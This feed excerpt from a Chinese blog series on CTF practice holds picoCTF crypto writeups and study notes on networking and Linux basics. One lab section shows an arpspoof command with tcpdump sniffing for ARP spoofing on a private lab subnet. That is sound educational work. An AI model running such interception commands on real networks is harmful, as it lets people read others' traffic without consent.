class="built_in">print</span>(ans)</span><br></pre></td></tr></tbody></table></figure><p>神奇地得到了一串新的 python 2 程式碼</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#asciiorder</span></span><br><span class="line"><span class="comment">#fortychars</span></span><br><span class="line"><span class="comment">#selfinput</span></span><br><span class="line"><span class="comment">#pythontwo</span></span><br><span class="line"></span><br><span class="line">chars = <span class="string">""</span></span><br><span class="line"><span class="keyword">from</span> fileinput <span class="keyword">import</span> <span class="built_in">input</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">input</span>():</span><br><span class="line">    chars += line</span><br><span class="line">b = <span class="number">1</span> / <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chars)):</span><br><span class="line">    <span class="keyword">if</span> i == b * b * b:</span><br><span class="line">        <span class="built_in">print</span> chars[i] <span class="comment">#prints</span></span><br><span class="line">        b += <span class="number">1</span> / <span class="number">1</span></span><br></pre></td></tr></tbody></table></figure><p>把修改成 python3 的程式碼然後再把這串程式碼當成輸入就得到 flag 了</p><p><code>picoctf{a....s}</code></p><h3 id="第四題rotation">第四題：rotation <a href="#第四題rotation" class="headerlink"></a></h3><p>根據題目給的密文隨便 rotate 一下就得到答案了</p><figure><img data-src="https://i.imgur.com/2PdDAFF.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="第五題readmycert">第五題：ReadMyCert <a href="#第五題readmycert" class="headerlink"></a></h3><p>查了一下解析 cert 的指令，然後就得到 flag 了</p><figure><img data-src="https://i.imgur.com/nabNssw.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="第六題hidetosee">第六題：HideToSee <a href="#第六題hidetosee" class="headerlink"></a></h3><p>查了一下隱寫術的工具，想用用 Steghide 但 mac一時裝不起來就隨便找了一個 <a href="https://futureboy.us/stegano/decinput.html">online tool</a>解出了一串看起來一副快是 flag 的東西</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">krxlXGU{zgyzhs_xizxp_05y2z65z}</span><br></pre></td></tr></tbody></table></figure><p>然後再用圖片中講到的 Atbash Cipher 解密看看，就成功得到 flag 了</p><figure><img data-src="https://i.imgur.com/wp3kUxt.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="總結">總結 <a href="#總結" class="headerlink"></a></h2><p>最後一天了，鐵人賽這段時間是我第一次這樣長時間接觸這些資安技術、刷CTF 題目，來看一下最後的成果</p><ul><li>每天六題 picoCTF<ul><li>達成： 103 / 174 題</li></ul></li><li>每三天一部 Beef Soup 的教學影片<ul><li>達成： 6 / 9 部</li></ul></li></ul><p>我的達成率大概只有 6 成ww，不過學到的技術還是挺多的，知道各種常見的題型，因為跟著課程學，主要還是在玩Web ，像是 path traversal, lfi, sql injection, … 一大堆可以玩的洞，而Crypto, pwn, reverse 都還沒有太多研究，目前感覺 web 的這些 CTF題目很好玩，雖然知道題目都是設計過的，但每次把一個看似一切正常的網站打出一個洞就很有成就感，之後應該會慢慢點開自己的技能樹，去參加一些酷酷的比賽(<del>可是最近真的參加太多活動太多了 RRRRRRRR</del>)</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言 &lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;三十天了！ 今天就寫六題 Crypto 的 Writeup ，最後再來個小小總結&lt;/p&gt;</summary>
    
    
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="一直刷 CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 鐵人賽 一直刷 CTF - Day29</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day29/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day29/</id>
    <published>2024-10-01T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言 <a href="#前言" class="headerlink"></a></h2><p>本日進度：</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></label></li></ul><span id="more"></span><h2 id="淺談網路與-h-t-t-p">淺談網路與 H T T P <a href="#淺談網路與-h-t-t-p" class="headerlink"></a></h2><h3 id="什麼是網路">什麼是網路？ <a href="#什麼是網路" class="headerlink"></a></h3><p>簡單來說就是把很多台電腦用網路線或是 WIFI串連在一起就是所謂的網路了</p><p>可以比喻為一個送信的過程</p><ol type="1"><li>撰寫信件內容</li><li>放進信封決定要掛號還是平信，還有寄給誰</li><li>季見底止和收件地址</li><li>把信給郵局，然後轉發到其他郵局再送到收件人手上（如果你要送的人就在你家隔壁，你就直接給他就好了）</li></ol><p>網路也是一樣的概念，假設要去瀏覽 Google 這個網站</p><ol type="1"><li>Application layer (信件內容)<br><img data-src="https://i.imgur.com/TyrNoiL.png" alt="Image"></li><li>Transport layer (信封)<br><img data-src="https://i.imgur.com/Mh6F6Ru.png" alt="Image"></li><li>Network layer (寄件人和收件人)<br><img data-src="https://i.imgur.com/ctf7Io9.png" alt="Image"><br><img data-src="https://i.imgur.com/BJAtXDq.png" alt="Image"></li><li>Link layer (郵局)<br><img data-src="https://i.imgur.com/WjtMKGY.png" alt="Image"></li></ol><h3 id="什麼事-mac-address">什麼事 Mac Address <a href="#什麼事-mac-address" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/guXiiJc.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>跟 IP 的差異是 IP 是可以變動的， Mac Address是固定的，所以在區域網路裡面是檢查 Mac Address 的，而不是 IP Address</p><p>在古代沒有 Switch 的時候， 適用 Hub 來連接多台電腦，但是 Hub是沒有腦袋的，他會把信送給所有人，每台電腦會檢查 Mac Address看那封信是不是寄給自己的，如果是就接收，如果不是就丟掉</p><figure><img data-src="https://i.imgur.com/r575Pbz.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>在有 Switch 後就只會把信送給對的人</p><figure><img data-src="https://i.imgur.com/TZKfGgs.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>但在我們瀏覽網頁是用 IP Address 來找到對方的，要找到對方的 MacAddress 就要用 ARP 協定</p><p><img data-src="https://i.imgur.com/NIA1F6B.png" alt="Image"><br><img data-src="https://i.imgur.com/R8bhGIW.png" alt="Image"></p><p>會有一個 ARP Table 來記錄對方的 MacAddress，固定一段時間後會清理和更新</p><p>會不會有資安問題？<br>會的，如果在我問目標的 Mac Address 時，有壞人騙我說他是目標的 MacAddress，這樣就會把信送給壞人，這就是 ARP Spoofing</p><figure><img data-src="https://i.imgur.com/3uRI4Kk.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---arp-spoofing">Lab - ARP Spoofing <a href="#lab---arp-spoofing" class="headerlink"></a></h3><p>Lab 關掉了不能玩 😥</p><figure><img data-src="https://i.imgur.com/2dhPc7O.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -Ai eth1</span><br></pre></td></tr></tbody></table></figure><p>tcpdump 去聽封包的內容， <code>-A</code> 是把封包的內容顯示出來，<code>-i</code> 是指定網卡</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arpspoof -i eth1 -t 192.168.111.1 192.168.111.2</span><br></pre></td></tr></tbody></table></figure><p>這個指令就會幫你實作 ARP Spoofing 把 <code>192.168.111.1</code>要傳給 <code>192.168.111.2</code> 的封包攔截</p><figure><img data-src="https://i.imgur.com/zWABU43.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="什麼是網路---網段">什麼是網路 - 網段 <a href="#什麼是網路---網段" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/9Qut1Lg.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>上下最不同的是，上面的送的人是區域網路，下面的是送給區域外的人，所以他是要經過Router 來轉發的</p><p>一樣用寄信來比喻</p><figure><img data-src="https://i.imgur.com/yFWXbH2.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/ckCjpOt.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>上下最大的差異就是在區域內還是區域外，在網路內也是一樣的，要怎沒看是在區域內外等等會講</p><figure><img data-src="https://i.imgur.com/2u1JCbv.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/xWRmV85.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>可以通過判斷目標 IP 是否是寄給 Default Gateway來判斷是區域內還是區域外</p><figure><img data-src="https://i.imgur.com/JfzeMAX.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>如何知道來源 IP 和目標 IP 是不是在同一個網段？</p><figure><img data-src="https://i.imgur.com/QC3dXek.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>把 Address 和 Netmask 的二進制做 AND 運算，就會是 Network ID，俗果兩個 Network ID 一樣就是在同一個網段 (所以如果 netmask 是<code>255.255.255.0</code> 的話其實就看 IP前九碼是不是都一樣就知道是不是在同區域，如果 netmask 是<code>255.255.0.0</code> 就看 IP 前六碼)</p><p><code>/24</code> 的意思 <code>255.255.255.0</code> 轉成二進制是<code>11111111.11111111.11111111.00000000</code> ，因為有 24 個1，就表示成 <code>/24</code></p><h3 id="什麼是網路---路由">什麼是網路 - 路由 <a href="#什麼是網路---路由" class="headerlink"></a></h3><p>資料送到 router 時， router 會根據上面的路由表傳送 packet，路由會根據他的路由地圖來決定要傳送給誰（就像我們可以利用 mtr看到我們資料是怎麼傳送目標的)</p><figure><img data-src="https://i.imgur.com/ARzYFfG.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>上面這個就是路由表，如果是 192.168.20.5 就會通過 192.168.20.2出去</p><figure><img data-src="https://i.imgur.com/hg8FCbD.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>router table 會以 netmask 最長的為優先</p><p>default gateway 就是 <code>0.0.0.0/0</code> 的縮寫，那如果沒有default gateway 就會找不到路徑，就會出現<code>Destination Host Unreachable</code></p><h3 id="tcp-vs-udp">TCP vs UDP <a href="#tcp-vs-udp" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/GzBbOug.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="udp">UDP <a href="#udp" class="headerlink"></a></h4><p>就是直接丟過去，不管有沒有真的收到</p><figure><img data-src="https://i.imgur.com/tdKM6ao.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="tcp">TCP <a href="#tcp" class="headerlink"></a></h4><p>如果需要可靠信傳送，要是資料很大用 UDP 傳過去可能就會很破碎，TCP就會每次都確認有沒有收到，有收到後才會傳下一個</p><figure><img data-src="https://i.imgur.com/MEndg57.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/Xj2Qrqw.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/9wLfeyg.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/RJqKk88.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>因為 TCP 的效能有點差，現在有一個叫做 QUIC 的協定，他是基於 UDP的，但是他有 TCP 的功能，所以效能會比較好</p><h3 id="port">Port <a href="#port" class="headerlink"></a></h3><p>因為一台電腦上有很多程式，所以要用 Port 來區分，每個服務都有自己的Port，像是 HTTP 預設是 80，HTTPS 是 443</p><h3 id="nat">NAT <a href="#nat" class="headerlink"></a></h3><p>現今 IPv4 最嚴重的問題，就是 IP 數量不夠用，因為 IP 最多就只有<code>2^32</code> 個，也就是 <code>4,294,967,296</code> 個，而且還有一些IP是不能用的，很明顯不可能讓地球上每個人都能用，這樣就會有些人沒有辦法用網路，所以就有兩個辦法</p><ol type="1"><li>換一個 IP 的協議: IPv6，但因為目前很多服務都是架在 IPv4上，大家也都還習慣用 IPv4，所以短期間就只能用下面那個方法</li><li>NAT: 既然我們 IP 不夠用，那就讓一些電腦有 IP 就好，其他電腦用假的IP<br><img data-src="https://i.imgur.com/kNC761j.png" alt="Image"><br><img data-src="https://i.imgur.com/mVPj0YS.png" alt="Image"><br>Router 會有一個 NAT Table 來記錄每個請求的 Source IP 和 DestinationIP，然後再把 Source IP 改成 Router 的IP，然後再把封包送出去，當對方回應時， Router 會根據 NAT Table把封包送到對應的電腦<br>但這樣還有個問題，如果有個 Server 架在 NAT後面，外面就戳不到，解決的方法就是 Port Forwarding<br><img data-src="https://i.imgur.com/DbLNxvt.png" alt="Image"><br><img data-src="https://i.imgur.com/Vr2qpuD.png" alt="Image"><br>會把外面送進拉的 Port 轉換成對應的內部 IP<br><a href="https://youtu.be/xleMUfUYbGw">How does NAT work</a></li></ol><h3 id="什麼是協定">什麼是協定 <a href="#什麼是協定" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/RSNrYo5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="http">HTTP <a href="#http" class="headerlink"></a></h4><blockquote><p>HTTP/2 之前的版本是一種建立在 TCP 上的傳輸協定。(HTTP/3例外，今天不提)<br>為何需要使用 TCP 是因為網頁他會需要可靠性的傳輸。</p></blockquote><figure><img data-src="https://i.imgur.com/ofobafe.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h5 id="request">Request <a href="#request" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/sPrrISD.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>路徑就是想要檔案的位置</p><h5 id="response">Response <a href="#response" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/VRbe3Ws.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>status code:2 開頭成功，3 開頭重新導向，4 開頭客戶端錯誤，5 開頭伺服器錯誤</p><h5 id="http-lab">HTTP Lab <a href="#http-lab" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/i7lPkRs.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/P1HGD39.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><a href="https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Methods">HTTPMethod</a></p><h4 id="dns">DNS <a href="#dns" class="headerlink"></a></h4><blockquote><p>全名叫做 Domain Name System，是一種建立在 UDP 的協定。<br>主要用來查詢 Domain Name 的 IP Address 或是查詢 IP Address 對應的 DomainName。<br>那什麼是 Domain Name 呢？</p></blockquote><figure><img data-src="https://i.imgur.com/P1axnwy.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/63XpbUD.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h5 id="dns-lab">DNS Lab <a href="#dns-lab" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/ezlp25H.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/25rSqEN.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="linux-基礎指令與使用者管理">Linux 基礎指令與使用者管理 <a href="#linux-基礎指令與使用者管理" class="headerlink"></a></h2><figure><img data-src="https://i.imgur.com/crswIVm.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="kernel-space-vs-user-space">Kernel Space vs User Space <a href="#kernel-space-vs-user-space" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/Cmt2y72.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>區分成這樣是為了讓 Kernel 方便管理 User Space 的 Application，避免有些 Application 搶資源，這時候就可以由 Kernel Space停止那些指令運行</p><h3 id="shell">Shell <a href="#shell" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/RFSND8t.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ssh">SSH <a href="#ssh" class="headerlink"></a></h3><p>Secure Shell Protocol</p><figure><img data-src="https://i.imgur.com/L8lFFSA.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><a href="https://blog.gtwang.org/linux/linux-ssh-public-key-authentication/">SSH金鑰登入 就不用打密碼了</a></p><h3 id="linux-目錄架構">Linux 目錄架構 <a href="#linux-目錄架構" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/aIJTb9C.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="檔案種類">檔案種類 <a href="#檔案種類" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/2dh0cQk.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="正規檔案-regular-file">正規檔案 (Regular File) <a href="#正規檔案-regular-file" class="headerlink"></a></h4><ul><li>檔案類型：<code>-</code></li><li>純文字檔 (ASCII)、二進位檔 (binary)、資料格式檔 (data)</li></ul><h4 id="目錄-directory">目錄 (Directory) <a href="#目錄-directory" class="headerlink"></a></h4><ul><li>檔案類型：<code>d</code></li><li>就是目錄</li></ul><h4 id="連結檔link">連結檔 (link) <a href="#連結檔link" class="headerlink"></a></h4><ul><li>檔案類型：<code>l</code></li><li>就同於 Windows 下的捷徑</li></ul><h4 id="設備與裝置檔device">設備與裝置檔 (device) <a href="#設備與裝置檔device" class="headerlink"></a></h4><ul><li>區塊 (block) 設備檔<ul><li>檔案類型：b</li><li>硬碟或儲存設備</li></ul></li><li>字元 (character) 設備檔<ul><li>檔案類型：c</li><li>鍵盤、滑鼠等</li></ul></li></ul><h4 id="資料接口檔sockets">資料接口檔 (sockets) <a href="#資料接口檔sockets" class="headerlink"></a></h4><ul><li>檔案類型：s</li><li>讓兩個程式做溝通，讓一個程式把資料灌進 sockets ，另一個程式就可以從sockets 拿資料</li></ul><h4 id="資料輸送檔fifo-pipe">資料輸送檔 (FIFO, pipe) <a href="#資料輸送檔fifo-pipe" class="headerlink"></a></h4><ul><li>檔案類型：p</li><li>讓不同進程間能溝通</li></ul><h3 id="用戶與群組">用戶與群組 <a href="#用戶與群組" class="headerlink"></a></h3><p>用戶：就用戶<br>群組：主群組和附加群組</p><h4 id="用戶-etcpassword">用戶 /etc/password <a href="#用戶-etcpassword" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/7j0LQsL.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>密碼不會存在這，所以上面是寫 <code>x</code></p><h4 id="用戶-etcshadow">用戶 /etc/shadow <a href="#用戶-etcshadow" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/VBwPnAJ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="群組-etcgroup">群組 /etc/group <a href="#群組-etcgroup" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/x6EP4D5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="群組-etcgshadow">群組 /etc/gshadow <a href="#群組-etcgshadow" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/cb7ZUgf.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="權限">權限 <a href="#權限" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/uYL8Ucw.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="目錄的權限">目錄的權限 <a href="#目錄的權限" class="headerlink"></a></h4><blockquote><p>r ：<br><br>表示具有讀取目錄結構清單的權限，可以查詢該目錄下的檔名資料。<br><br>w ：<br><br>建立新的檔案與目錄；<br><br>刪除已經存在的檔案與目錄 (不論該檔案的權限為何！)<br><br>將已存在的檔案或目錄進行更名；<br><br>搬移該目錄內的檔案、目錄位置。<br><br>x (access directory)：<br><br>使用者能否進入該目錄成為工作目錄的用途（能否 cd 進入）<br></p></blockquote><figure><img data-src="https://i.imgur.com/WrkLjvg.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="特殊權限-suidsgidsbit">特殊權限 SUID/SGID/SBIT <a href="#特殊權限-suidsgidsbit" class="headerlink"></a></h4><blockquote><p>SUID：執行時相當於擁有檔案 owner 的權限，僅對檔案生效<br><br>SGID：<br><br>對檔案設定：執行時相當於擁有檔案 group 的權限<br><br>對目錄設定：此目錄下的有效群組 (effectivegroup) 將會變成該目錄的群組<br><br>SBIT：僅能對目錄設定，使用者在該目錄下建立檔案或目錄時，僅有自己與 root才有權力刪除該檔案<br><br>SUID = 4 SGID = 2 SBIT = 1 _755</p></blockquote><figure><img data-src="https://i.imgur.com/sixviML.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="umask">Umask <a href="#umask" class="headerlink"></a></h4><p>他的值會是 777 減去 umask 的值，所以如果 umask 是 022 的話，那就是755</p><p><code>-S</code>: 顯示成比較好檢視的樣子</p><figure><img data-src="https://i.imgur.com/z3UIhku.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="未知的指令">未知的指令 <a href="#未知的指令" class="headerlink"></a></h3><ul><li>Google</li><li><code>man xxx</code></li><li><code>xxx -h</code> / <code>xxx --help</code></li></ul><h3 id="常見指令">常見指令 <a href="#常見指令" class="headerlink"></a></h3><ul><li><code>cd</code>: change directory (可用絕對路徑或相對路徑)</li><li><code>pwd</code>: print working directory</li><li><code>ls</code>: list<ul><li><code>-a</code>: 顯示隱藏檔</li><li><code>-l</code>: 顯示詳細資訊 (<code>ll</code> 是 <code>ls -l</code>的縮寫)</li></ul></li><li><code>exa</code>: 跟 <code>ls</code> 類似，但是有顏色</li><li><code>rm</code>: remove<ul><li><code>-r</code>: 遞迴刪除</li><li><code>-f</code>: 強制刪除</li></ul></li><li><code>cp</code>: copy</li><li><code>mv</code>: move</li><li><code>cat</code>: concatenate</li><li><code>tac</code>: 反向顯示</li><li><code>od</code>: octal dump</li><li><code>nl</code>: number lines (會把檔案的每一行編號)</li><li><code>more</code>: 一次顯示一頁</li><li><code>less</code>: 也是一次顯示一頁，但是可以往前翻 (vim的操作方式)</li><li><code>mkdir</code>: make directory</li><li><code>touch</code>: 建立檔案</li><li><code>rmdir</code>: remove directory</li><li><code>nano</code>: 編輯器</li><li><code>vi</code>: 很棒的編輯器</li><li><code>vim</code>: 更棒的編輯器</li><li><code>chmod</code>: change mode<ul><li><code>chmod 777 xxx</code>: 三個數字分別代表user/group/others，每個數字代表 rwx，所以 777 就是全部都有 rwx</li><li><code>chmod -x xxx</code>: 移除所有人對 xxx 的執行權限</li><li><code>chmod +x xxx</code>: 給所有人對 xxx 的執行權限</li><li><code>chmod u+x xxx</code>: 給 user 對 xxx 的執行權限 (u = user, g =group, o = others, a = all)</li><li>也可設定 SUID/SGID/SBIT 可以用 <code>chmod 4755 xxx</code> 來設定SUID ，然後<code>+s</code> 來設定 SUID / SGID，<code>+t</code> 來設定SBIT</li></ul></li><li><code>chown</code>: change owner<ul><li><code>chown user xxx</code>: 把 xxx 的 owner 改成 user</li><li><code>chown user:group xxx</code>: 把 xxx 的 owner 改成 user，group改成 group</li></ul></li><li><code>chgrop</code>: change group<ul><li><code>chgrp group xxx</code>: 把 xxx 的 group 改成 group</li></ul></li><li><code>chattr</code>: change attribute<ul><li><code>chattr +i xxx</code>: 讓 xxx 變成不可刪除</li><li><code>chattr +a xxx</code>: 讓 xxx 變成只能增加資料，不能刪除</li><li>其他不常用需要再看</li></ul></li><li><code>lsattr</code>: 顯示檔案屬性</li><li><code>passwd</code>: 更改密碼</li><li><code>which</code> / <code>whereis</code>: 找指令的位置</li><li><code>tar</code>: 包裝 or 壓縮檔案<ul><li><code>v</code>: 顯示詳細資訊</li><li><code>f</code>: 檔案名稱</li><li><code>c</code>: 建立壓縮檔</li><li><code>j</code>: 用 bzip2 壓縮</li><li><code>z</code>: 用 gzip 壓縮</li><li><code>J</code>: 用 xz 壓縮</li><li><code>x</code>: 解壓縮</li><li><code>tar -cvf xxx.tar xxx</code>: 壓縮</li><li><code>tar -xvf xxx.tar</code>: 解壓縮</li><li><code>tar -zcvf xxx.tar.gz xxx</code>: 壓縮成 .tar.gz</li><li><code>tar -zxvf xxx.tar.gz</code>: 解壓縮 .tar.gz</li></ul></li><li>pipe: <code>|</code>，把前面的結果傳給後面<ul><li>例如 <code>ls | grep xxx</code> 就是把 <code>ls</code> 的結果傳給<code>grep</code> 來找 <code>xxx</code></li></ul></li><li><code>sleep</code>: 會暫停後面接的秒數</li><li>一些特殊 combo<ul><li><code>Ctrl+C</code>: 中斷目前的指令</li><li><code>Ctrl+Z</code>: 暫停目前的指令 (suspended)<ul><li><code>jobs</code>: 查看暫停的指令</li><li><code>fg</code>: 把暫停的指令恢復 (利用 <code>%{number}</code>來指定要恢復 jobs 中指令的編號)</li><li><code>bg</code>: 把暫停的指令變成背景執行</li></ul></li><li><code>Ctrl+D</code>: EOF</li></ul></li><li>redirect:<code>&gt;</code>，把前面的結果寫到後面的檔案，<code>&gt;&gt;</code> 是append， <code>&lt;</code> 是把檔案的內容傳給後面的指令<ul><li><code>ls &gt; xxx.txt</code> 就是把 <code>ls</code> 的結果寫到<code>xxx.txt</code></li><li><code>ls &gt;&gt; xxx.txt</code> 就是把 <code>ls</code> 的結果append 到 <code>xxx.txt</code></li><li><code>cat &lt; xxx.txt</code> 就是把 <code>xxx.txt</code> 的內容傳給<code>cat</code></li><li><code>2&gt;</code> 是把錯誤訊息寫到檔案</li></ul></li><li>regex<ul><li>可以在 <a href="https://regexlearn.com/">regexlearn</a> 學</li><li>在 <a href="https://regex101.com/">regex101</a> 測試</li><li><code>.</code>: 任意字元</li><li><code>*</code>: 0 到無限多次</li><li><code>+</code>: 1 到無限多次</li><li><code>[abc]</code>: a, b, c 任一個</li><li><code>[^abc]</code>: 除了 a, b, c 之外</li><li><code>[a-z]</code>: a 到 z 之間</li></ul></li><li><code>sed</code>: stream editor 有點複雜，會用到的時候再查就好</li><li><code>grep</code>: global regular expression print<ul><li><code>-i</code>: 不分大小寫</li><li><code>-v</code>: 反向選取</li><li><code>-n</code>: 顯示行數</li><li><code>-r</code>: 遞迴</li><li><code>-l</code>: 只顯示檔名</li><li><code>-c</code>: 只顯示數量</li><li><code>-e</code>: 多個條件</li><li><code>-E</code>: 正規表達式</li><li><code>-A</code>: 顯示後面幾行</li><li><code>-B</code>: 顯示前面幾行</li><li><code>-C</code>: 顯示前後幾行</li><li><code>grep xxx *</code>: 在所有檔案中找 <code>xxx</code></li></ul></li><li><code>find</code>: 找檔案</li><li>bash script<ul><li>就是用 <code>.sh</code> 結尾的檔案，然後裡面寫一些指令</li><li>然後在檔案裡面寫一些指令，<code>chmod</code>加執行權限就可以執行了</li></ul></li><li><code>crontab</code>: 定時執行<ul><li><code>crontab -e</code>: 編輯</li><li><code>crontab -l</code>: 列出</li><li><code>crontab -r</code>: 刪除</li><li><code>* * * * * xxx</code>: 分鐘 小時 日 月 星期幾 指令</li></ul></li><li>apt / mirror: 安裝套件<ul><li><code>apt update</code>: 更新套件</li><li><code>apt upgrade</code>: 升級套件 (順序會是先更新再升級)</li><li><code>apt install xxx</code>: 安裝套件</li><li><code>apt remove xxx</code>: 移除套件</li><li><code>apt search xxx</code>: 搜尋套件</li><li><code>apt list</code>: 列出所有套件</li><li><code>apt show xxx</code>: 顯示套件資訊</li><li><code>apt autoremove</code>: 移除不需要的套件</li><li><code>apt clean</code>: 清除快取</li><li><code>apt autoclean</code>: 清除舊的快取</li></ul></li><li><code>$()</code>: 會優先執行 <code>()</code>指令的標準輸出，當成前面的指令的參數<ul><li>例如 <code>echo $(ls)</code> 就是把 <code>ls</code> 的結果傳給<code>echo</code></li></ul></li><li><code>cut</code>: 切割<ul><li><code>-d</code>: 分隔符號</li><li><code>-f</code>: 第幾個</li><li><code>cut -d " " -f 1 xxx</code>: 以空格切割，取第一個</li></ul></li></ul><h2 id="參考資料">參考資料 <a href="#參考資料" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】手把手 Python 教學— 從入門到入侵</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB1</a></li><li><a 